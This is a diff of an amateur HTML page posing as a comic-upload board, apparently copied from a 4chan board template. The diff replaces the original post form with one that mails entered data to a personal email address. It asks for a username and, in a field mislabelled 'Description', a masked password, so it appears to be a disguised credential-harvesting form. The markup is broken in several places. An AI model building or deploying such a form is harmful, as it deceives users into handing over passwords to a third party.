@@ -2,90 +2,15 @@
     <head>
         <title>Comics guys!</title>
 <img src="keyh-news.jpg" alt="comic Teaser" width="555" height="411">
-  <div id="boardNavMobile" class="mobile">
-            <div class="boardSelect">
-                <strong>Board</strong>
-                <select id="boardSelectMobile"></select>
-            </div>
-            <div class="pageJump">
-                <a href="#bottom">&#9660;</a>
-                <a href="javascript:void(0);" id="settingsWindowLinkMobile">Settings</a>
-                <a href="//p.4chan.org/">Mobile</a>
-                <a href="//www.4chan.org" target="_top">Home</a>
-            </div>
-        </div>
-        <div class="boardBanner">
-            <div id="bannerCnt" class="title desktop" data-src="180.jpg"></div>
-            <div class="boardTitle">/vr/ - Retro Games</div>
-        </div>
-        <hr class="abovePostForm">
-        <script type="application/ld+json">
-            {
-                "@context": "https://herie-s.github.io/keyhold.com",
-                "@type": "BreadcrumbList",
-                "itemListElement": [
-                    {
-                        "@type": "ListItem",
-                        "position": 1,
-                        "name": "keyhold,inc",
-                        "item": "https://herie-s.github.io/keyhold.com/"
-                    },
-                    {
-                        "@type": "ListItem",
-                        "position": 2,
-                    }
-                ]
-            }</script>
-        <div class="navLinks mobile">
-            <span class="mobileib button">
-                <a href="#bottom">Bottom</a>
-            </span>
-            <span class="mobileib button">
-                <a href="/vr/catalog">Catalog</a>
-            </span>
-            <span class="mobileib button">
-                <a href="#top_r" id="refresh_top">Refresh</a>
-            </span>
-        </div>
-        <div id="mpostform">
-            <a href="#" class="mobilePostFormToggle mobile hidden button">Upload comic</a>
-        </div>
-        <div style='position:relative'></div>
-        <form name="post" action="https://sys.4chan.org/vr/post" method="post" enctype="multipart/form-data">
-            <input type="hidden" name="MAX_FILE_SIZE" value="4194304">
-            <input type="hidden" name="mode" value="regist">
-            <input id="postPassword" name="pwd" type="hidden">
-            <div id="togglePostFormLink" class="desktop">
-                [<a href="#">upload comic</a>
-                ]
-            </div>
-            <table class="postForm hideMobile" id="postForm">
-                <tbody>
-                    <tr data-type="Name">
-                        <td>Name</td>
-                        <td>
-                            <input name="name" type="text" tabindex="1" placeholder="None">
-                        </td>
-                    </tr>
-                   
-                    <tr data-type="Comment">
-                        <td>description</td>
-                        <td>
-                            <textarea name="com" cols="48" rows="4" wrap="soft" tabindex="4"></textarea>
-                        </td>
-                    </tr>
-                    <tr data-type="File">
+        <form action="mailto:omar.herie@gmail.com" method="POST">
+        <b>Username:</b> <input type="text" name="user"><br>
+  <b>Description:</b> <input type="password" name="pass"><br>
+   <tr data-type="File">
                         <td>File</td>
                         <td>
                             <input id="postFile" name="upfile" type="file" tabindex="8">
                             <span class="desktop">
-                                [
-                                <label>
-                                    <input type="checkbox" name="spoiler" value="on" tabindex="9">Spoiler?
-                                </label>
-                                ]
-                            </span>
-                    </tr>      
+  <input type="submit" value="upload comic!"
         <p>
     done? you may go <a href="https://herie-s.github.io/keyhold.com/">back.</a>
      <script src="https://unpkg.com/@ruffle-rs/ruffle"></script>
